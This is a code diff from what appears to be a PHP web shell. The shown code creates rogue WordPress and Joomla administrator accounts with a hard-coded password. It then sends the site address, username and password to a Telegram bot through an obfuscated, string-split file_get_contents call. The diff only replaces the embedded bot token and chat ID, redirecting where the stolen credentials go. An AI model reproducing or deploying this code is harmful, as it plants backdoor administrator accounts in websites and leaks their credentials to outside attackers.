@@ -4433,7 +4433,7 @@ $solevisible=@mysqli_query($conn,"insert into ".$prefix."usermeta (umeta_id,user
 if($solevisible){
 $wpSuccess = "NEW WP ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/wp-login.php%0AUsername: ".$admin."%0APassword: kafka1337";
 $f_get = 'f'.'il'.'e'.'_'.'ge'.'t'.'_'.'c'.'on'.'te'.'nt';
-$alfawp = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot63'.'7616'.'235'.'2:AA'.'Fx9Q'.'JiMcyagYW_FnkR3Pg8UrHwPJSxYaU/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=18'.'995'.'298'.'71&'.'text=';
+$alfawp = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot'.'8220'.'859'.'290:'.'AAGZBWQRwBYN8mkL6sMaSOQcbxPz6RED31M'.'/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
 $f_get(rawurlencode($alfawp.$wpSuccess));
 __alert('Success... '.$admin.' is created...');}
 }
@@ -4481,7 +4481,7 @@ $solevisible=@mysqli_query($conn,"INSERT INTO ".$prefix."user_usergroup_map (use
 if($solevisible){
 $jomSuccess = "NEW JOOMLA ADMIN%0A%0ALogin: ".$_SERVER['SERVER_NAME']."/administrator/%0AUsername: ".$admin."%0APassword: kafka1337";
 $f_get = 'f'.'il'.'e'.'_'.'ge'.'t'.'_'.'c'.'on'.'te'.'nt';
-$alfajoom = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot63'.'7616'.'235'.'2:AA'.'Fx9Q'.'JiMcyagYW_FnkR3Pg8UrHwPJSxYaU/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=18'.'995'.'298'.'71&'.'text=';
+$alfajoom = 'ht'.'tp'.'s:'.'/'.'/a'.'pi'.'.t'.'el'.'egr'.'am.'.'or'.'g/b'.'ot'.'8220'.'859'.'290:'.'AAGZBWQRwBYN8mkL6sMaSOQcbxPz6RED31M'.'/se'.'ndM'.'es'.'sa'.'ge'.'?c'.'hat'.'_id'.'=1377'.'200203&'.'text=';
 $f_get(rawurlencode($alfajoom.$jomSuccess));
 __alert('Success... '.$admin.' is created...');}
 }
